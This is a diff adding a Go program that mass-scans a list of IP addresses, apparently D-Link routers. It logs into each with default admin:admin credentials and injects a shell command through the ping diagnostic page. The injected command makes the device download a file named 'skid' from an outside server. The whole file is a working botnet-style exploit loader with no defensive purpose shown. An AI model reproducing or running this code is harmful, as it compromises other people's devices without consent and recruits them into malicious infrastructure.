@@ -1,0 +1,143 @@
+package main
+
+import (
+	"fmt"
+	"net/http"
+	"strings"
+	"os"
+	"bufio"
+)
+
+func main() {
+	// Open the file containing IP addresses
+	file, err := os.Open("ips.txt")
+	if err != nil {
+		fmt.Println("Error opening ips.txt:", err)
+		return
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+
+	// Iterate through each line (IP address) in the file
+	for scanner.Scan() {
+		ip := scanner.Text()
+		processIP(ip)
+		if err := scanner.Err(); err != nil {
+			fmt.Println("Error reading ips.txt:", err)
+			return
+		}
+	}
+}
+
+func processIP(ip string) {
+	url := fmt.Sprintf("http://%s:80", ip) // Replace PORT with the actual port number
+	request, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		fmt.Println("Error creating request:", err)
+		return
+	}
+
+	request.Header.Add("Cache-Control", "max-age=0")
+	request.Header.Add("Upgrade-Insecure-Requests", "1")
+	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36")
+	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+	request.Header.Add("Accept-Encoding", "gzip, deflate")
+	request.Header.Add("Accept-Language", "en-US,en;q=0.9")
+	request.Header.Add("Connection", "close")
+
+	client := &http.Client{}
+	response, err := client.Do(request)
+	if err != nil {
+		fmt.Println("Error sending request:", err)
+		return
+	}
+	defer response.Body.Close()
+
+	sessionID := getSessionIDFromResponse(response)
+
+	// Create a new request with the retrieved SESSIONID value in the Cookie and Authorization headers
+	newRequest, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		fmt.Println("Error creating new request:", err)
+		return
+	}
+	newRequest.Header.Add("Cache-Control", "max-age=0")
+	newRequest.Header.Add("Authorization", "Basic YWRtaW46YWRtaW4=")
+	newRequest.Header.Add("Upgrade-Insecure-Requests", "1")
+	newRequest.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36")
+	newRequest.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+	newRequest.Header.Add("Accept-Encoding", "gzip, deflate")
+	newRequest.Header.Add("Accept-Language", "en-US,en;q=0.9")
+	newRequest.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s", sessionID))
+	newRequest.Header.Add("Connection", "close")
+
+	newResponse, err := client.Do(newRequest)
+	if err != nil {
+		fmt.Println("Error sending new request:", err)
+		return
+	}
+	defer newResponse.Body.Close()
+
+	if newResponse.StatusCode == http.StatusOK {
+		fmt.Println("[DLINK] successfully logged in for IP:", ip)
+		sendCustomRequest(ip, sessionID) // Call the sendCustomRequest function here
+	} else {
+		fmt.Println("[DLINK] login unsuccessful for IP:", ip)
+	}
+}
+
+func sendCustomRequest(ip, sessionID string) {
+	// Construct the custom request URL and headers
+	customURL := fmt.Sprintf("http://%s:80/cgi-bin/Main_Analysis_Content.asp?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&next_host=87.14.201.104&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&applyFlag=1&preferred_lang=EN&firmver=1.0.7.6&cmdMethod=ping&destIP=-c%3Bcd+/tmp%3a+wget+http%3A%2F%2F45.88.67.38%2Fskid&pingCNT=5", ip)
+	customRequest, err := http.NewRequest("GET", customURL, nil)
+	if err != nil {
+		fmt.Println("Error creating custom request:", err)
+		return
+	}
+
+	// Set headers using the provided session ID
+	customRequest.Header.Add("Authorization", "Basic YWRtaW46YWRtaW4=")
+	customRequest.Header.Add("Upgrade-Insecure-Requests", "1")
+	customRequest.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36")
+	customRequest.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+	customRequest.Header.Add("Referer", fmt.Sprintf("http://%s:80/cgi-bin/Main_Analysis_Content.asp", ip))
+	customRequest.Header.Add("Accept-Encoding", "gzip, deflate")
+	customRequest.Header.Add("Accept-Language", "en-US,en;q=0.9")
+	customRequest.Header.Add("Cookie", fmt.Sprintf("SESSIONID=%s", sessionID))
+	customRequest.Header.Add("Connection", "close")
+
+	client := &http.Client{}
+	customResponse, err := client.Do(customRequest)
+	if err != nil {
+		fmt.Println("Error sending custom request:", err)
+		return
+	}
+	defer customResponse.Body.Close()
+
+	if customResponse.StatusCode == http.StatusOK {
+		fmt.Println("[DLINK] payload successfully sent")
+	} else {
+		fmt.Println("[DLINK] payload not sent")
+	}
+}
+
+
+
+func getSessionIDFromResponse(response *http.Response) string {
+	for key, values := range response.Header {
+		if strings.EqualFold(key, "Set-Cookie") {
+			for _, value := range values {
+				cookieParts := strings.Split(value, ";")
+				for _, part := range cookieParts {
+					part = strings.TrimSpace(part)
+					if strings.HasPrefix(part, "SESSIONID=") {
+						sessionID := strings.TrimPrefix(part, "SESSIONID=")
+						return sessionID
+					}
+				}
+			}
+		}
+	}
+	return ""
+}
